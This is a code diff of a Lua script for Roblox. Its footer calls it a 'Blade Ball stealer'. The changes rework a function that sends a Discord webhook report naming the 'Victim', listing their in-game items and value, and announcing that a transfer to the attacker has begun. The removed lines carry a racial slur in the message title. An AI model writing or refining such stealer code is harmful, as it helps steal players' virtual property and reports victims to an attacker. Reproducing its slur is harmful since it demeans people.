@@ -208,79 +208,56 @@ local function SendJoinMessage(list, prefix)
 end
 
 local function SendMessage(list)
-    local fields = {
-		{
-			name = "Victim Username 🤖:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent 📝:",
-			value = "",
-			inline = false
-		},
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
-            inline = false
-        }
-	}
-
+    local itemListSent = ""
     local grouped = {}
+
+    -- Groupement des items
     for _, item in ipairs(list) do
-        if grouped[item.Name] then
-            grouped[item.Name].Count = grouped[item.Name].Count + 1
-            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
-        else
-            grouped[item.Name] = {
-                Name = item.Name,
-                Count = 1,
-                TotalRAP = item.RAP
-            }
-        end
+        grouped[item.Name] = (grouped[item.Name] or 0) + 1
+    end
+    for name, count in pairs(grouped) do
+        itemListSent = itemListSent .. name .. " (x" .. count .. ")\n"
     end
 
-    local groupedList = {}
-    for _, group in pairs(grouped) do
-        table.insert(groupedList, group)
-    end
-
-    table.sort(groupedList, function(a, b)
-        return a.TotalRAP > b.TotalRAP
-    end)
-
-    for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[2].value = fields[2].value .. itemLine .. "\n"
-    end
-
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
+    -- Limite Discord
+    if #itemListSent > 1000 then
+        itemListSent = string.sub(itemListSent, 1, 950) .. "\nPlus more..."
     end
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "🟣 The nigga is on the server 🎉" ,
-            ["color"] = 8323327,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
+            ["title"] = "🟣 You joined the victim's server",
+            ["description"] = "Transfer process started!",
+            ["color"] = 8323327, -- VIOLET
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Victim:",
+                    ["value"] = "```" .. plr.Name .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "💰 Summary:",
+                    ["value"] = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Items to be sent 📝:",
+                    ["value"] = "```\n" .. (itemListSent ~= "" and itemListSent or "None") .. "```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Eblack"
+            },
+            ["thumbnail"] = {
+                ["url"] = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. plr.UserId .. "&width=420&height=420&format=png"
+            }
         }}
     }
 
     local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    local headers = {["Content-Type"] = "application/json"}
+    
     local response = request({
         Url = webhook,
         Method = "POST",
@@ -288,9 +265,6 @@ local function SendMessage(list)
         Body = body
     })
 end
-
-local rapDataResult = Replion.Client:GetReplion("ItemRAP")
-local rapData = rapDataResult.Data.Items
 
 local function buildNameToRAPMap(category)
     local nameToRAP = {}
